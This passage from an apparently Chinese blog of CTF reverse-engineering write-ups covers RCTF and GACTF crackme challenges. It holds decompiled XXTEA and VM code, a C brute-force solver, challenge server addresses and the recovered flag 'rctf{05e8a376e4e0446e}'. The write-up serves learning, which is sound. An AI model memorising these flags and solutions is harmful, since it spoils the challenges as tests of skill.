class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 &lt; <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = -a2;</span><br><span class="line">  v25 = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / v24 + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v25 )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = &amp;a1[v24 - <span class="number">1</span>];</span><br><span class="line">    v27 = ~v4;</span><br><span class="line">    v44 = &amp;a1[~v4];</span><br><span class="line">    v28 = -v4 - <span class="number">3</span> - ((-v4 - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFE</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = v25 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &lt;= <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = v27;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v30 = v44;</span><br><span class="line">        v31 = v27;</span><br><span class="line">        v32 = *v44;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v33 = *(v30 - <span class="number">1</span>);</span><br><span class="line">          v30 -= <span class="number">2</span>;</span><br><span class="line">          v34 = v32;</span><br><span class="line">          v32 = *v30;</span><br><span class="line">          v35 = ((v5 ^ v25) + (v33 ^ *(_DWORD *)(a3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v31 ^ (<span class="keyword">unsigned</span> __int8)v29) &amp; <span class="number">3</span>)))) ^ (((<span class="number">4</span> * v5) ^ (v33 &gt;&gt; <span class="number">5</span>)) + ((v5 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v33)));</span><br><span class="line">          v36 = v31 - <span class="number">1</span>;</span><br><span class="line">          v31 -= <span class="number">2</span>;</span><br><span class="line">          v37 = v34 - v35;</span><br><span class="line">          v38 = *v30;</span><br><span class="line">          v30[<span class="number">2</span>] = v37;</span><br><span class="line">          v5 = v33</span><br><span class="line">             - ((((<span class="number">16</span> * v38) ^ (v37 &gt;&gt; <span class="number">3</span>)) + ((v32 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v37))) ^ ((v32 ^ *(_DWORD *)(a3</span><br><span class="line">                                                                                           + <span class="number">4L</span>L</span><br><span class="line">                                                                                           * (((<span class="keyword">unsigned</span> __int8)v29 ^ v36) &amp; <span class="number">3</span>)))</span><br><span class="line">                                                                        + (v25 ^ v37)));</span><br><span class="line">          v30[<span class="number">1</span>] = v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v28 != v31 );</span><br><span class="line">      &#125;</span><br><span class="line">      v39 = &amp;a1[v31];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v40 = *--v39;</span><br><span class="line">        v5 = v39[<span class="number">1</span>]</span><br><span class="line">           - (((v5 ^ v25) + (v40 ^ *(_DWORD *)(a3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v29 ^ (<span class="keyword">unsigned</span> __int8)v31) &amp; <span class="number">3</span>)))) ^ (((v5 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v40)) + ((v40 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v5))));</span><br><span class="line">        v39[<span class="number">1</span>] = v5;</span><br><span class="line">        --v31;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v31 );</span><br><span class="line">      v41 = *a1</span><br><span class="line">          - (((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)*v26 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v5)) + ((<span class="number">16</span> * *v26) ^ (v5 &gt;&gt; <span class="number">3</span>))) ^ ((*(_DWORD *)(a3 + <span class="number">4L</span>L * (v29 &amp; <span class="number">3</span>)) ^ *v26)</span><br><span class="line">                                                                                   + (v25 ^ v5)));</span><br><span class="line">      v42 = v25 == <span class="number">0x9E3779B9</span>;</span><br><span class="line">      v25 += <span class="number">0x61C88647</span>;</span><br><span class="line">      v5 = v41;</span><br><span class="line">      *a1 = v41;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v42 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以确定这是个XXTEA的解密过程。</p><p>接着回到<code>sub_1180()</code>，可以看到XXTEA decrypt后还有一些操作：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210407155638353.png"></p><p>最后一个byte的值即v11要&lt;&#x3D;0x04才能进入到这个关键return，并且把让v8[a5]&#x3D;0x00截断，此时a5&#x3D;8-v11。</p><p>同时这里出现的这个关键变量<code>a5</code>，就是传进来的第五个参数即主函数的<code>v9</code>，这个变量控制着主函数下面的输出：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210407161610960.png"></p><p>前面题目也说了，<code>&quot;Input right flag you can got &#39;Bingo!&#39; :&quot;</code>，所以这里就是输出<code>Bingo!</code>的地方，长度不对等，有两种可能：</p><ul><li>v9&#x3D;6，按字节xor 0x17并输出前6字节。</li><li>v9&gt;&#x3D;7，第七字节xor 0x17后&#x3D;0x00，即第七字节&#x3D;0x17，把字符串在puts的时候截断。</li></ul><p>无论如何，前六字节都已经确定了，分别是<code>Bingo!</code>每字节xor 0x17的值。</p><p>加密（解密）方法确定，接下来，我们只需要确定各参数里放的数据就行了。</p><p>从调用<code>sub_CE0()</code>处可以依次确定主函数里的<code>unk_202010</code>是XXTEA的key，<code>v5</code>存着解密后的字符串，<code>v9</code>是解密后字符串的长度。</p><p>于是原关键部分标记成：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210407155703617.png"></p><p>在<code>sub_13D0()</code>中，我们可以发现一个用得很频繁的常数——<code>0x1021</code>：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210407143659106.png"></p><p>通过常数和8轮的xor可以猜测是CRC的其中一种（计网刚学完hhh），在搜索引擎查一下<code>0x1021</code>这个常数也能知道是一种CRC-16：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210407143836970.png"></p><p>看了一下算法对比感觉是<code>CRC-16/X25</code>（见<a href="https://blog.csdn.net/leumber/article/details/54311811">CRC16常见几个标准的算法及C语言实现_leumber的专栏-CSDN博客</a>），然而是什么其实都不重要，反正校验算法就意味着不能通过逆向计算来通过27106反推出字符串。</p><p>那么，汇总一下：现在相当于我们拿到了<strong>这个字符串</strong>前六字节（xor 0x17以后等于<code>Bingo!</code>），并且<strong>这个字符串</strong>通过<code>CRC-16/X25</code>计算后出27106，由题目描述知道<code>MD5(rctf&#123;your answer&#125;) == 5f8243a662cf71bf31d2b2602638dc1d</code>。而<strong>这个字符串</strong>是由一个<strong>十六字节的输入</strong>经过unhexlify以后再经过XXTEA的解密后得到的。</p><p>既然有校验存在（md5和crc），那我们就愉快地爆破吧。</p><p>理论上说应该是只用crc爆破的，但crc容易有多解，所以题目描述又多加了一层md5防止多解。</p><p>所以其实只用md5来爆破就好。</p><p>先用<code>[hex(ord(x)^0x17) for x in &#39;Bingo!&#39;]</code>算一下前六字节：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210421102212307.png"></p><p>按小端组合，可以得到这两个解密出来的数字分别是<code>0x70797e55</code>和<code>0xZZZZ3678</code>（高两字节未知）。</p><p>于是写得爆破的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MD5.c来自https://github.com/pod32g/MD5</span></span><br><span class="line"><span class="comment">// 下载文件后删掉main函数的定义，和本exp放在同目录下即可食用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MD5.c&quot;</span></span></span><br><span class="line"><span class="comment">// 以下是XXTEA加解密部分，来自https://blog.csdn.net/gsls200808/article/details/48243019</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 爆破部分</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>]=&#123;<span class="number">0xE0C7E0C7</span>, <span class="number">0xC6F1D3D7</span>, <span class="number">0xC6D3C6D3</span>, <span class="number">0xC4D0D2CE</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">16</span>]=&#123;<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">//这里unhex不能确定是大写十六进制还是小写十六进制，都爆破一遍就好</span></span><br><span class="line">    <span class="keyword">int</span> n= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">4</span>;i++)&#123; <span class="comment">//v11&lt;=4</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">0x100</span>;j++)&#123; <span class="comment">//爆破第二字节</span></span><br><span class="line">            <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">0x70797e55</span>, <span class="number">0x00003678</span>|((i&lt;&lt;<span class="number">24</span>)+(j&lt;&lt;<span class="number">16</span>))&#125;;</span><br><span class="line">            btea(v, n, k);</span><br><span class="line">            <span class="keyword">char</span> flag[<span class="number">23</span>]=<span class="string">&quot;rctf&#123;&quot;</span>;</span><br><span class="line">            <span class="keyword">int</span> pos=<span class="number">5</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>;a&lt;<span class="number">2</span>;a++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;<span class="number">4</span>;b++)&#123;</span><br><span class="line">                    flag[pos]=hex[*((<span class="keyword">uint8_t</span>*)v+a*<span class="number">4</span>+b)&gt;&gt;<span class="number">4</span>];</span><br><span class="line">                    flag[pos+<span class="number">1</span>]=hex[*((<span class="keyword">uint8_t</span>*)v+a*<span class="number">4</span>+b)&amp;<span class="number">0x0f</span>];</span><br><span class="line">                    pos+=<span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            flag[pos]=<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">            flag[pos+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint8_t</span> res[<span class="number">16</span>];</span><br><span class="line">            md5((<span class="keyword">uint8_t</span>*)flag,<span class="built_in">strlen</span>(flag),res);</span><br><span class="line">            <span class="keyword">char</span> flag_md5[<span class="number">33</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;<span class="number">16</span>;x++) <span class="built_in">sprintf</span>(flag_md5+<span class="number">2</span>*x,<span class="string">&quot;%02x&quot;</span>,res[x]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(flag_md5,<span class="string">&quot;5f8243a662cf71bf31d2b2602638dc1d&quot;</span>)) <span class="built_in">printf</span>(<span class="string">&quot;[*]flag: %s\n&quot;</span>,flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破就能得到flag啦~</p><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210421112745190.png"></p><p><strong>rctf{05e8a376e4e0446e}</strong></p><hr><h1 id="2019-RCTF-babyre2"><a href="#2019-RCTF-babyre2" class="headerlink" title="[2019 RCTF] babyre2"></a>[2019 RCTF] babyre2</h1><blockquote><ul><li>2019 RCTF &#x2F; Reverse &#x2F; 28 solved</li><li>Completed：</li><li>参考wp：<ul><li>有？</li></ul></li></ul></blockquote><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>yet another baby reverse for u…</p><p>nc 139.180.215.222 20000</p><p>nc 123.206.174.203 20000</p><h2 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h2><p>是一个变量巨多函数也居多的题。</p><p>分析过程不再赘述，要么比较简单要么跟前面挺像的，直接贴出最后改了名的分析结果好了：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210423161024319.png"></p><p>其中有一个需要忽略的函数<code>sub_564B320C6B90()</code>，这个函数主要是用于输入输出用的，相当于一个VM的I&#x2F;O机，可以不用管。</p><p>整个程序的流程是依次让我们输入<code>account</code>、<code>password</code>、<code>data</code>三个数据，如果经历了一系列加密以后通过了<code>check</code>，则输出flag。</p><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><hr><h1 id="2020-GACTF-EasyRe"><a href="#2020-GACTF-EasyRe" class="headerlink" title="[2020 GACTF] EasyRe"></a>[2020 GACTF] EasyRe</h1><blockquote><ul><li>2020 GACTF &#x2F; Reverse &#x2F; 38 solved</li><li>Completed：2021.01.02</li><li>参考wp：<ul><li>无（ohhhh！</li></ul></li></ul></blockquote><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>Layers of protection～</p><p>Overseas：<a href="https://drive.google.com/file/d/1TobAUm_innt7RoQ7ZI4q1CNUWKuH-Tsw/view?usp=sharing">https://drive.google.com/file/d/1TobAUm_innt7RoQ7ZI4q1CNUWKuH-Tsw/view?usp=sharing</a></p><h2 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h2><p>用ida打开发现main看起来没什么特别的，就是输入一个lld。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103164252941.png"></p><p>不过一个一个函数往下翻可以看到sub_8049065()这个，调用了一个mprotect函数（警觉</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103164436661.png"></p><p>mprotect的作用一般是改某段内存的读&#x2F;写&#x2F;执行权限，并且下面sub_8048EA5()还用了一个函数（就是主函数中即将调用的函数）作为参数，这就要立刻想到smc了，sub_8048EA5()就是加密函数。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103164654874.png"></p><p>这边一看就感觉很复杂的样子，那就懒得逆了，直接动态调试看看过完加密以后sub_8048838()是什么样子。在这个函数下个断点，执行到的时候直接步入。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103165118166.png"></p><p>可以看到这边比较散乱，因为数据全部被处理过了，要看到反汇编和反编译代码就要首先把它们undefined，然后重新分析。</p><p>这个函数的起始地址是0x8048838，结束地址是0x8048DE1，算一下长度是0x8048DE1-0x8048838+1&#x3D;1450。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103165327087.png"></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103165437843.png"></p><p>然后用ida_bytes的del_items函数（7.4的api开始不再兼容6.x的api了，在7.4以前还能用idc.MakeUnkn，见<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4</a>）或者选这个区域直接右键-&gt;Undefined把这部分undefined掉，再在0x8048838出按<code>p</code>创建函数。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103170654811.png"></p><p>可以看到这其实是个vm题，smc+vm真不愧是Layers of protection呢hhh。vm代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_8048838</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">113</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">6</span>] -= <span class="number">4</span>;</span><br><span class="line">      *(_DWORD *)a1[<span class="number">6</span>] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] += a1[<span class="number">2</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] -= a1[<span class="number">4</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">67</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] *= a1[<span class="number">3</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">68</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] /= a1[<span class="number">5</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[sub_80487EF(a1, <span class="number">1</span>)] = *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">2</span>);</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">119</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">83</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)a1[<span class="number">3</span>]);</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">34</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span 